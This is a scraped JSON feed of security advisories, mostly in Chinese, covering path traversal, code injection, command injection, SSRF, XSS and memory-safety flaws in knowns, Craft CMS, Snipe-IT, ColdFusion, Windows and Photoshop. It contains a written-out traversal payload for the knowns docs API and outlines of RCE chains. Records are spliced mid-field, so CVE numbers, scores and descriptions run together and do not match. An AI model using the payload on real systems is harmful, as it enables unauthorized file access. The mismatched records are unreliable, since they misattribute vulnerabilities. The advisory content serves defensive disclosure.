"2026-09-08T19:47:18+00:00", "_first_saved_at": "2026-09-08T19:47:18+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-ub52-v610"}, {"analysis_status": 0, "articles": [{"content": "攻击者可以通过构造特定的输入来绕过应用程序对文件路径的验证，进而访问应用程序之外的文件或目录。这种漏洞通常出现在应用程序根据用户提供的输入来确定文件路径的场景中，如文件下载、文件读取或包含其他文件的操作。", "title": "什么是路径遍历"}, {"content": "- 字符串拼接：攻击者提供包含特殊字符的文件路径，以获取目标文件系统中的敏感文件。例如，攻击者可以使用\"../\"表示向上导航到上层目录，然后获取目标目录中的文件。\n- NULL字节攻击：攻击者通过插入空字节（\\0）来截断文件路径，绕过应用程序的路径检查。这种攻击通常针对使用C/C++编程语言的应用程序，因为C字符串是以NULL字节结尾的。\n- 编码绕过攻击：攻击者可以尝试使用特殊编码（如URL编码、Unicode编码）绕过输入验证，使应用程序无法正确解析文件路径，从而实现路径遍历。", "title": "路径遍历常见的攻击方式"}, {"content": "- 输入验证和过滤：应该对所有从用户输入或不可信来源获取的文件路径进行验证和过滤。确保输入只包含允许的字符，并且没有包含特殊字符或路径导航符号。\n- 白名单验证：使用白名单机制来限制文件路径的选择范围。只允许用户访问应用程序所需的特定目录或文件，拒绝访问其他目录或文件。\n- 完整的路径解析：在构造文件路径时，使用完整的路径解析方法，以确保路径的正确性和合法性。避免使用相对路径或不完整的路径。\n- 限制访问权限：确保应用程序和服务器的文件系统设置正确，限制应用程序只能访问必要的文件和目录。使用操作系统级别的文件系统权限控制来限制访问权限。\n- 安全编码实践：开发人员应遵循安全的编码实践，如使用安全的API和框架、避免拼接用户输入和文件路径、不信任用户输入等。", "title": "如何预防路径遍历"}], "cnvd_id": "", "cve_id": "CVE-2026-86775", "cvss": {"cvssv31": [{"source": "disclosure@vulncheck.com", "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:L", "severity": "high", "base_score": 8.6}], "cvssv4": [{"source": "disclosure@vulncheck.com", "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:H/VA:L/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X", "severity": "high", "base_score": 8.8}]}, "cvss_score": 8.8, "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:H/VA:L/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X", "cwe": "CWE-22", "description": "known（npm 包）版本 \u003c= 0.29.1 包含文档 API 中的路径遍历漏洞。 Internal/server/routes/docs.go 中的 HTTP 处理程序使用 cleanDocPath() 规范化用户提供的文档路径，该路径会去除前导/尾随斜杠和 .md 后缀，但不会中和 ../ 遍历序列，然后，internal/storage/doc_store.go 使用 filepath.Join(ds.docsDir(), filepath.FromSlash(doc.Path)+\".md\") 而不验证解析的路径是否保留在文档目录中。在默认部署中，管理 API 未经身份验证并绑定到所有接口，远程未经身份验证的攻击者可以提供遍历有效负载（例如，向 POST /api/docs 提供 {\"path\": \"../../../../tmp/knowns_pwn_marker\"} ，或向 GET /api/docs/... 提供编码路径），以读取、创建、覆盖或删除主机上任何位置具有 .md 扩展名的任意文件。文件系统并通过 os.MkdirAll 创建任意目录。这可能会暴露其他项目文档中存储的敏感数据，损坏或破坏文件，并提供可能链接到代码执行的任意写入原语。该问题已在 0.30.0 版本中修复。", "effects": [{"comp_name": "knowns", "ecosystem": "linux", "versions": [{"affected_version": "(0,0.30.0)", "min_fixed_version": "0.30.0", "repository": "unmanaged", "solutions": [], "upstream": true}, {"affected_version": "(-∞,0.30.0]", "min_fixed_version": "", "repository": "unmanaged", "solutions": [], "upstream": true}]}], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "低", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "路径遍历", "kind_en": "对受限制目录的路径名的不正确限制（“路径遍历”）", "last_modified_time": "2026-09-09", "level": "High", "mps_id": "MPS-x7wy-fj2o", "poc": false, "poc_url": [], "published_time": "2026-09-09", "reference_url_list": [{"url": "https://www.oscs1024.com/hd/MPS-x7wy-fj2o", "name": "https://www.oscs1024.com/hd/MPS-x7wy-fj2o"}, {"url": "https:/ :X/AU:X/R:X/V:X/RE:X/U:X", "cwe": "CWE-94", "description": "Craft CMS 是开源 PHP 内容管理系统，通过 Composer 包 craftcms/cms 发布，用于构建后台可控的网站与内容体验。\n受影响版本中，控制面板 element-index 接口会把请求体中的 criteria 应用到元素查询。ElementHelper::cleanseQueryCriteria() 保留 withTransforms，Component::cleanseConfig() 保留 class，使 criteria[withTransforms][0][class] 进入查询。当资源库查询返回至少一条资产时，eager loader 将其传入 ImageTransforms::normalizeTransform()，PHP 数组展开使后出现的 class 覆盖 Craft::createObject() 的目标类型，攻击者可实例化任意类，并利用 yii\\rbac\\PhpManager 将 itemFile 指向含 User-Agent PHP 载荷的请求日志，在 Web 进程中执行代码。\n修复版本中通过在 ImageTransforms::normalizeTransform() 对数组形态输入拒绝 class 键并抛出 InvalidArgumentException，阻止覆盖对象工厂目标类型，切断任意类实例化与远程代码执行链路。", "effects": [{"comp_name": "craftcms/cms", "ecosystem": "composer", "versions": [{"affected_version": "[5.0.0-RC1,5.10.12)", "min_fixed_version": "5.10.12", "repository": "composer", "solutions": [], "upstream": true}]}], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "中", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "代码注入", "kind_en": "代码生成控制不当（“代码注入”）", "last_modified_time": "2026-09-08", "level": "High", "mps_id": "MPS-qgoi-xme2", "poc": false, "poc_url": [], "published_time": "2026-09-09", "reference_url_list": [{"url": "https://www.oscs1024.com/hd/MPS-qgoi-xme2", "name": "https://www.oscs1024.com/hd/MPS-qgoi-xme2"}, {"url": "https://nvd.nist.gov/vuln/detail/CVE-2026-86732", "name": "https://nvd.nist.gov/vuln/detail/CVE-2026-86732"}, {"url": "https://github.com/craftcms/cms/security/advisories/GHSA-9wcj-wqqh-cqvg", "name": "GitHub Security Advisory (GHSA-9wcj-wqqh-cqvg)"}, {"url": "https://www.vulncheck.com/advisories/craft-cms-before-5.10.12-remote-code-execution-via-element-index", "name": "VulnCheck Advisory: Craft CMS before 5.10.12 Remote Code Execution via element-index"}], "scope_influence": "", "tags": ["php", "开源"], "title": "Craft CMS远程代码执行", "_translated": true, "_saved_at": "2026-09-08T16:59:21+00:00", "_first_saved_at": "2026-09-08T16:59:21+00:00", "_sourc loit_requirement_cost": "中", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "对搜索路径元素未加控制", "kind_en": "Uncontrolled Search Path Element", "last_modified_time": "2026-09-09", "level": "High", "mps_id": "MPS-gsuv-6j2a", "poc": false, "poc_url": [], "published_time": "2026-09-09", "reference_url_list": [{"url": "https://www.oscs1024.com/hd/MPS-gsuv-6j2a", "name": "https://www.oscs1024.com/hd/MPS-gsuv-6j2a"}, {"url": "https://nvd.nist.gov/vuln/detail/CVE-2026-76199", "name": "https://nvd.nist.gov/vuln/detail/CVE-2026-76199"}, {"url": "https://helpx.adobe.com/security/products/photoshop/apsb26-130.html", "name": ""}], "scope_influence": "", "tags": ["应用软件"], "title": "Photoshop搜索路径漏洞", "_translated": true, "_saved_at": "2026-09-09T05:46:55+00:00", "_first_saved_at": "2026-09-08T22:16:57+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-gsuv-6j2a"}, {"analysis_status": 0, "articles": [{"content": "应用程序未能正确验证和过滤用户输入，将用户提供的数据直接用作操作系统命令的一部分。攻击者可以利用这个漏洞，通过注入恶意的操作系统命令来执行任意系统命令、获取敏感信息或者对系统进行未授权的操作。", "title": "什么是OS命令注入"}, {"content": "- 命令拼接：应用程序将用户输入直接拼接到操作系统命令中，而不进行合适的过滤和验证。攻击者可以通过在输入中注入特殊字符、命令分隔符等，来执行额外的命令或修改原始命令的行为。\r\n- 命令注释：攻击者通过在输入中注入特殊字符或命令注释符号，如\"#\"或\"//\"，来注释掉原始命令中的一部分，然后执行自己的恶意命令。\r\n- 命令管道：攻击者通过在输入中注入管道符号\"|\"，将多个命令连接起来执行。这使得攻击者可以在单个注入点上执行多个命令，进一步扩大攻击的范围。", "title": "OS命令注入常见的攻击方式"}, {"content": "- 输入验证与过滤：应用程序应该对用户输入进行严格的验证和过滤，确保只接受预期的有效输入。可以使用白名单验证，限制用户输入的字符集和格式，防止特殊字符和命令注释符的注入。\r\n- 使用参数化命令或预编译语句：应该使用参数化命令或预编译语句，而不是将用户输入直接拼接到命令中。这样可以将输入数据视为参数，而不是命令的一部分，从而避免命令注入漏洞。\r\n- 最小特权原则：应用程序在执行操作系统命令时，应该使用最小特权原则，即使用具有最低权限的用户或服务来执行操作。这样即使发生命令注入漏洞，攻击者的权限也会受到限制。\r\n- 安全编码实践：开发人员应避免使用不受信任的用户输入来拼接命令，并使用安全的编码实践，如输入验证、输出编码和参数化查询等。\r\n- 使用Web应用程序防火墙（WAF）：部署Web应用程序防火墙可以帮助检测和阻止命令注入攻击。", "title": "如何预防OS命令注入"}], "cnvd_id": "", "cve_id": "CVE-2026-86733", "cvss": {"cvssv31": [{"source": "disclosure@vulncheck.com", "vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H", "severity": "high", "base_score": 7.2}], "cvssv4": [{"source": "disclosure@vulncheck.com", "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X", "severity": "high", "base_score": 8.6}]}, "cvss_score": 8.6, "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X", "cwe": "CWE-78", "description": "Snipe-IT 是开源 IT 资产管理系统，基于 PHP Laravel 构建，用于资产盘点、借还、配件与许可证管理。\n受影响版本中，已认证超级管理员可向 POST /admin/backups/upload 上传含恶意 SQL 条目的 ZIP 备份，再向 POST /admin/backups/restore/{filename} 发起恢复且不提交可选的 clean 参数。SettingsController::postRestore 调用 Artisan 命令 snipeit:restore 后，RestoreFromBackup::handle 通过 proc_open 将备份 SQL 以标准输入管道传入 mysql 客户端，调用时未加 --binary-mode。MySQL/MariaDB 客户端会把以 \\! 开头的行解释为本机 shell 命令，从而以 Web 应用操作系统用户执行任意命令，读取数据库凭据、APP_KEY 等应用密钥并改写应用可写文件与数据。默认 APP_LOCKED 为 false、DB_SANITIZE_BY_DEFAULT 为 false，该恢复路径默认不会启用 SQL 清理。\n修复版本中通过在 RestoreFromBackup::handle 调用 mysql 客户端时增加 --binary-mode 标志，禁止客户端在非交互输入中解释 \\!、system、source 等本地命令，切断备份 SQL 进入本机命令执行的路径。", "effects": [{"comp_name": "snipe/snipe-it", "ecosystem": "composer", "versions": [{"affected_version": "(-∞,8.7.0)", "min_fixed_version": "8.7.0", "repository": "composer", "solutions": [], "upstream": true}]}], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "中", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "OS命令注入", "kind_en": "操作系统命令中使用的特殊元素的不正确中和（“操作系统命令注入”）", "last_modified_time": "2026-09-08", "level": "High", "mps_id": "MPS-ienf-z0r3", "poc": false, "poc_url": [], "published_time": "2026-09-09", "reference_url_list": [{"url": "https://www.oscs1024.com/hd/MPS-ienf-z0r3", "name": "https://www.oscs1024.com/hd/MPS-ienf-z0r3"}, {"url": "https://nvd.nist.gov/vuln/detail/CVE-2026-86733", "name": "https://nvd.nist.gov/vuln/detail/CVE-2026-86733"}, {"url": "https://github.com/grokability/snipe-it/security/advisories/GHSA-x53f-48vj-c5fc", "name": "GitHub Security Advisory (GHSA-x53f-48vj-c5fc)"}, {"url": "https://www.vulncheck.com/advisories/snipe-it-before-8.7.0-remote-code-execution-via-backup-restore", "name": "VulnCheck Advisory: Snipe-IT before 8.7.0 Remote Code Execution via Backup Restore"}], "scope_influence": "", "tags": ["php", "开源"], "title": "Snipe-IT备份恢复命令注入", "_translated": true, "_saved_at": "2026-09-08T16:59:24+00:00", "_first_saved_at": "2026-09-08T16:59:24+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-ienf-z0r3"}, {"analysis_status": 0, "articles": [], "cnvd_id": "", "cve_id": "CVE-2026-76190", "cvss": {"cvssv31": [{"source": "psirt@adobe.com", "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:H/A:N", "severity": "high", "base_score": 8.6}]}, "cvss_score": 8.6, "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:H/A:N", "cwe": "CWE-95", "description": "Adobe ColdFusion 是商业闭源应用服务器，用于构建和运行基于 CFML 的 Web 应用与后端服务。\n受影响版本中，动态求值代码里的指令未得到正确中和，存在 Eval Injection 缺陷。未授权远程攻击者可在无需用户交互的情况下利用该缺陷，在当前用户上下文中执行任意代码，且影响范围会扩展到当前组件之外。\n修复版本中通过 Adobe APSB26-119 安全更新收紧动态求值路径对不可信输入的处理，阻止恶意指令再进入被求值代码，切断任意代码执行链路。", "effects": [{"comp_name": "coldfusion", "ecosystem": "linux", "versions": [{"affected_version": "(-∞,2025.0.13)", "min_fixed_version": "2025.0.13", "repository": "unmanaged", "solutions": [], "upstream": true}, {"affected_version": "(-∞,2023.0.24)", "min_fixed_version": "2023.0.24", "repository": "unmanaged", "solutions": [], "upstream": true}]}], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "低", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "eval注入", "kind_en": "动态评估代码中指令的不当中和（“评估注入”）", "last_modified_time": "2026-09-09", "level": "High", "mps_id": "MPS-vyc7-21z6", "poc": false, "poc_url": [], "published_time": "2026-09-09", "reference_url_list": [{"url": "https://www.oscs1024.com/hd/MPS-vyc7-21z6", "name": "https://www.oscs1024.com/hd/MPS-vyc7-21z6"}, {"url": "https://nvd.nist.gov/vuln/detail/CVE-2026-76190", "name": "https://nvd.nist.gov/vuln/detail/CVE-2026-76190"}, {"url": "https://helpx.adobe.com/security/products/coldfusion/apsb26-119.html", "name": ""}], "scope_influence": "", "tags": ["应用软件"], "title": "ColdFusion Eval注入漏洞", "_translated": true, "_saved_at": "2026-09-09T05:46:53+00:00", "_first_saved_at": "2026-09-08T22:16:54+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-vyc7-21z6"}, {"analysis_status": 0, "articles": [{"content": "- 当攻击者欺骗合法的基于 Web 的应用程序或站点接受来自可信来源的请求时，就会发生跨站点脚本攻击。\r\n- 这是通过转义 Web 应用程序的上下文来完成的； 然后，Web 应用程序将该数据与其他受信任的动态内容一起交付给其用户，而无需对其进行验证。 浏览器不知不觉地在客户端执行恶意脚本（通过客户端语言；通常是 JavaScript 或 HTML）以执行通常被浏览器的同源策略阻止的操作。\r\n- ֿ注入恶意代码是最普遍的XSS利用方式； 因此，转义字符以防止这种操作是保护代码免受此漏洞影响的首要方法。\r\n- 转义意味着应用程序被编码以标记关键字符，特别是用户输入中包含的关键字符，以防止这些字符在危险的上下文中被解释。 例如，在 HTML 中，\u003c 可以编码为 \u0026lt; 并且\u003e可以被编码为\u0026gt; 为了在文本中被解释和显示为它们自己，而在代码本身中，它们被用于 HTML 标记。 如果将恶意内容注入到转义特殊字符的应用程序中，并且该恶意内容使用 \u003c 和 \u003e 作为 HTML 标记，那么如果这些字符在应用程序代码中正确转义，那么这些字符将不会被浏览器解释为 HTML 标记。 转移未遂攻击的方式。\r\n- XSS 最突出的用途是窃取 cookie（来源：OWASP HttpOnly）和劫持用户会话，但 XSS 漏洞已被用于暴露敏感信息、允许访问特权服务和功能以及传播恶意软件。", "title": "什么是XSS"}, {"content": "| 类型        | 描述                                                         |\r\n| ----------- | ------------------------------------------------------------ |\r\n| 存储型      | 攻击者将恶意代码插入到应用程序中（通常作为链接）。 每次用户单击链接时，代码都会被激活。 |\r\n| 反射型      | 攻击者从易受攻击的网站应用程序外部向用户提供恶意链接。 单击时，恶意代码将发送到易受攻击的网站，将攻击反映回用户的浏览器。 |\r\n| 基于 DOM 的 | 攻击者强制用户的浏览器呈现恶意页面。 页面中的数据本身提供跨站点脚本数据。 |\r\n| 变异        | 攻击者注入看似安全的代码，但随后在解析标记时被浏览器重写和修改。 一个例子是重新平衡未闭合的引号，甚至为未引用的参数添加引号。 |", "title": "XSS常见的攻击方式"}, {"content": "- 在将 HTTP 请求中的数据输入反射回来之前对其进行清理，确保在将任何数据回显给用户之前验证、过滤或转义所有数据，例如搜索期间的查询参数值。\r\n- 将特殊字符（如 ?、\u0026、/、\u003c、\u003e 和空格）转换为其各自的 HTML 或 URL 编码等价物。\r\n- 为用户提供禁用客户端脚本的选项。\r\n- 重定向无效请求。\r\n- 检测同时登录，包括来自两个不同 IP 地址的登录，并使这些会话无效。\r\n- 使用并执行内容安全策略（Content Safe Policy）来禁用可能被 XSS 攻击操纵的任何功能。\r\n- 阅读代码中引用的所有库的文档，了解哪些元素允许嵌入 HTML。", "title": "如何预防XSS"}], "cnvd_id": "", "cve_id": "CVE-2026-75993", "cvss": {"cvssv31": [{"source": "psirt@adobe.com", "vector": "CVSS:3.1/AV:A/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N", "severity": "high", "base_score": 8.5}]}, "cvss_score": 8.5, "cvss_vector": "CVSS:3.1/AV:A/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N", "cwe": "CWE-79", "description": "Adobe ColdFusion 是商业 Web 应用服务器，用于开发和部署基于 CFML 的动态网站与后台服务，源码未公开。\n受影响版本中，产品存在反射型跨站脚本问题。相邻网络中的攻击者可将恶意脚本注入网页响应，受害者打开恶意文件后，脚本在其浏览器中执行，可能获取提升后的访问权限或控制其账户与会话，且影响会越出存在漏洞的组件。\n修复版本中通过 Adobe 安全更新 APSB26-119 切断该反射型脚本注入路径，阻止恶意内容再进入受害者浏览器执行；公开资料未披露更细粒度的源码修改。", "effects": [{"comp_name": "ColdFusion 2023", "ecosystem": "linux", "versions": [{"affected_version": "(-∞,2023.0.24)", "min_fixed_version": "2023.0.24", "repository": "unmanaged", "solutions": [], "upstream": true}]}, {"comp_name": "ColdFusion 2025", "ecosystem": "linux", "versions": [{"affected_version": "(-∞,2025.0.13)", "min_fixed_version": "2025.0.13", "repository": "unmanaged", "solutions": [], "upstream": true}]}], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "中", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "XSS", "kind_en": "网页生成期间输入的不正确中和（“跨站点脚本”）", "last_modified_time": "2026-09-09", "level": "High", "mps_id": "MPS-mxtd-al97", "poc": false, "poc_url": [], "published_time": "2026-09-09", "reference_url_list": [{"url": "https://www.oscs1024.com/hd/MPS-mxtd-al97", "name": "https://www.oscs1024.com/hd/MPS-mxtd-al97"}, {"url": "https://nvd.nist.gov/vuln/detail/CVE-2026-75993", "name": "https://nvd.nist.gov/vuln/detail/CVE-2026-75993"}, {"url": "https://helpx.adobe.com/security/products/coldfusion/apsb26-119.html", "name": ""}], "scope_influence": "", "tags": ["应用软件"], "title": "ColdFusion反射型XSS漏洞", "_translated": true, "_saved_at": "2026-09-09T05:46:59+00:00", "_first_saved_at": "2026-09-08T22:17:03+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-mxtd-al97"}, {"analysis_status": 0, "articles": [], "cnvd_id": "", "cve_id": "CVE-2026-75999", "cvss": {"cvssv31": [{"source": "psirt@adobe.com", "vector": "CVSS:3.1/AV:A/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H", ": "high", "base_score": 7.6}], "cvssv4": [{"source": "disclosure@vulncheck.com", "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:P/VC:H/VI:N/VA:L/SC:H/SI:N/SA:L/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X", "severity": "high", "base_score": 8.3}]}, "cvss_score": 8.3, "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:P/VC:H/VI:N/VA:L/SC:H/SI:N/SA:L/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X", "cwe": "CWE-918", "description": "8.7.0之前的Snipe-IT版本无法对验收PDF生成器中的employee_num字段进行HTML转义，从而允许具有users.edit权限的攻击者将img标签注入TCPDF的writeHTML()函数中。攻击者可以制作包含带有任意 HTTP(S) URL 的 img 标签的恶意 employee_num 值，以在受害者签署资产接受协议时触发对内部服务、云元数据端点或外部目标的服务器端请求。", "effects": [{"comp_name": "snipe-it", "ecosystem": "linux", "versions": [{"affected_version": "[8.6.3,8.7.0)", "min_fixed_version": "8.7.0", "repository": "unmanaged", "solutions": [], "upstream": true}]}], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "低", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "SSRF", "kind_en": "服务器端请求伪造 (SSRF)", "last_modified_time": "2026-09-09", "level": "High", "mps_id": "MPS-emdn-vhu5", "poc": false, "poc_url": [], "published_time": "2026-09-09", "reference_url_list": [{"url": "https://www.oscs1024.com/hd/MPS-emdn-vhu5", "name": "https://www.oscs1024.com/hd/MPS-emdn-vhu5"}, {"url": "https://nvd.nist.gov/vuln/detail/CVE-2026-86771", "name": "https://nvd.nist.gov/vuln/detail/CVE-2026-86771"}, {"url": "https://github.com/grokability/snipe-it/security/advisories/GHSA-73xg-j94v-gjcf", "name": "GitHub Security Advisory (GHSA-73xg-j94v-gjcf)"}, {"url": "https://www.vulncheck.com/advisories/snipe-it-before-8.7.0-server-side-request-forgery-via-employee-num", "name": "VulnCheck Advisory: Snipe-IT before 8.7.0 Server-Side Request Forgery via employee_num"}], "scope_influence": "", "tags": ["应用软件", "终端软件"], "title": "8.7.0 之前的 Snipe-IT 通过 employee_num 进行服务器端请求伪造", "_translated": true, "_saved_at": "2026-09-09T14:58:44+00:00", "_first_saved_at": "2026-09-09T14:58:44+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-emdn-vhu5"}, {"analysis_status": 0, "articles": [{"content": "应用程序使用已释放的内存区域。当一个对象被释放后，程序可能继续引用该内存地址，导致使用了无效的内存。攻击者可以利用这个漏洞，通过修改已释放的内存内容来执行恶意代码或者获取敏感信息。", "title": "什么是UAF"}, {"content": "- 悬空指针攻击：攻击者利用程序中的已释放指针，重新分配内存并故意将指针指向已释放的内存区域。然后，当程序继续使用该指针时，攻击者可以执行恶意代码或者篡改内存数据。\r\n- 虚函数表劫持：针对面向对象的程序，攻击者可以通过修改已释放对象的虚函数表（VTable）指针，来改变程序的行为。攻击者可以控制程序执行任意代码或者调用任意函数。\r\n- 堆喷射：攻击者通过大量分配和释放特定大小的内存块，以创建特定的内存布局。然后，攻击者可以利用UAF漏洞来操作特定的内存块，例如修改函数指针，从而实现代码执行。", "title": "UAF常见的攻击方式"}, {"content": "- 释放后置空指针：在释放内存后，立即将指针置为空，防止后续误用。\r\n- 使用析构函数：在对象被释放时，使用析构函数来清理相关资源，避免UAF漏洞的发生。\r\n- 使用引用计数或垃圾回收机制：引入引用计数或垃圾回收机制可以自动处理内存释放，减少UAF的发生。\r\n- 使用现代化的编程语言和框架：现代编程语言和框架通常具有内存管理机制，如自动内存回收和强类型检查，可以有效减少UAF漏洞的发生。\r\n- 定期更新和修复：及时更新和修复软件，包括操作系统、应用程序和库文件，以防止已知的UAF漏洞被攻击利用。", "title": "如何预防UAF"}], "cnvd_id": "", "cve_id": "CVE-2026-83997", "cvss": {"cvssv31": [{"source": "secure@microsoft.com", "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H", "severity": "high", "base_score": 8.1}]}, "cvss_score": 8.1, "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H", "cwe": "CWE-416", "description": "在 Windows 消息队列中使用 after free 允许未经授权的攻击者通过网络执行代码。", "effects": [{"comp_name": "windows_10_21H2", "ecosystem": "linux", "versions": [{"affected_version": "[10.0.19044.0,10.0.19044.7725)", "min_fixed_version": "10.0.19044.7725", "repository": "unmanaged", "solutions": [], "upstream": true}]}, {"comp_name": "windows_10_22H2", "ecosystem": "linux", "versions": [{"affected_version": "[10.0.19045.0,10.0.19045.7725)", "min_fixed_version": "10.0.19045.7725", "repository": "unmanaged", "solutions": [], "upstream": true}]}, {"comp_name": "windows_11_23H2", "ecosystem": "linux", "versions": [{"affected_version": "[10.0.22631.0,10.0.22631.7582)", "min_fixed_version": "10.0.22631.7582", "repository": "unmanaged", "solutions": [], "upstream": true}]}, {"co rst_saved_at": "2026-09-08T19:47:33+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-bqr7-d59f"}, {"analysis_status": 0, "articles": [{"content": "由于整数类型的有限范围，在进行算术运算或操作时，结果可能超出类型的表示范围，导致溢出或环绕。溢出指的是结果超过了类型的最大值或小于了最小值，而环绕指的是结果绕回到类型的最小值或最大值。", "title": "什么是整数溢出或环绕"}, {"content": "- 缓冲区溢出：整数溢出可能导致缓冲区溢出漏洞。当整数溢出导致分配的缓冲区大小不足以容纳结果时，攻击者可以利用这个漏洞覆盖相邻的内存区域，执行恶意代码或篡改程序的状态。\r\n- 身份验证绕过：在进行身份验证或访问控制时，整数溢出可能导致绕过验证的漏洞。攻击者可以构造特殊的输入，使溢出的整数值绕过了预期的验证逻辑，从而获得未经授权的访问权限。\r\n- 数据篡改：整数溢出可能导致数据篡改漏洞。攻击者可以通过使整数溢出，修改计数器、索引或其他控制数据的值，导致程序在处理数据时发生错误或执行意外的操作。", "title": "整数溢出或环绕常见的攻击方式"}, {"content": "- 输入验证与限制：对用户输入的整数进行合理的验证和限制，确保其在允许的范围内。\r\n- 使用安全的整数操作函数：使用安全的整数操作函数，如`add_with_overflow()`、`sub_with_overflow()`、`mul_with_overflow()`等，这些函数会检查并处理溢出情况，确保计算结果在安全范围内。\r\n- 类型检查和转换：在进行整数运算或操作之前，进行类型检查和转换，确保操作数的类型和范围是合适的。\r\n- 强制性编码标准和最佳实践：制定强制性的编码标准和最佳实践，包括对整数运算和操作的规范和限制，以帮助程序员编写更可靠、安全的代码。\r\n- 静态代码分析和测试：使用静态代码分析工具和测试技术来检测和识别潜在的整数溢出问题。这些工具可以帮助发现代码中可能存在的溢出漏洞，并及时修复。", "title": "如何预防整数溢出或环绕"}], "cnvd_id": "", "cve_id": "CVE-2026-75771", "cvss": {"cvssv31": [{"source": "psirt@adobe.com", "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H", "severity": "high", "base_score": 7.8}]}, "cvss_score": 7.8, "cvss_vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H", "cwe": "CWE-190", "description": "Photoshop Desktop is affected by an Integer Overflow or Wraparound vulnerability that could result in arbitrary code execution in the context of the current user. Exploitation of this issue requires user interaction in that a victim must open a malicious file.", "effects": [{"comp_name": "Photoshop 2025", "ecosystem": "linux", "versions": [{"affected_version": "(-∞,26.11.7]", "min_fixed_version": "", "repository": "unmanaged", "solutions": [], "upstream": true}, {"affected_version": "(0,26.11.6]", "min_fixed_version": "", "repository": "unmanaged", "solutions": [], "upstream": true}]}, {"comp_name": "Photoshop 2026", "ecosystem": "linux", "versions": [{"affected_version": "(0,27.6]", "min_fixed_version": , {"content": "- 消耗计算资源：攻击者可以发送计算密集型的请求，例如复杂的计算、无限循环或递归操作，以耗尽应用程序的计算资源，导致应用程序无法响应其他请求。\r\n- 消耗内存资源：攻击者可以发送大量的数据或恶意输入，以导致应用程序消耗过多的内存资源，从而使系统的可用内存耗尽，并导致应用程序崩溃或变得不可用。\r\n- 消耗网络带宽：攻击者可以发送大量的请求或大型数据包，以消耗应用程序所依赖的网络带宽。这会导致其他合法用户无法正常访问应用程序或降低系统的整体网络性能。\r\n- 消耗存储资源：攻击者可以发送大量的请求或上传大文件，以耗尽应用程序的存储资源，导致系统无法处理其他请求或存储新的数据。", "title": "拒绝服务常见的攻击方式"}, {"content": "- 输入验证与过滤：应用程序应该对输入数据进行合理的验证和过滤，防止恶意输入导致资源消耗过高。\r\n- 实施资源限制：应用程序应该实施适当的资源限制策略，例如限制计算操作的时间或次数，限制内存使用量，限制并发连接数等，以防止资源被耗尽。\r\n- 异常处理与错误恢复：应用程序应该具备健壮的异常处理和错误恢复机制，以防止因意外错误导致资源泄漏或无法释放的情况。\r\n- 资源监控与警报：应用程序应该实施适当的资源监控和警报机制，及时发现异常的资源消耗情况，并采取相应的措施来应对。\r\n- 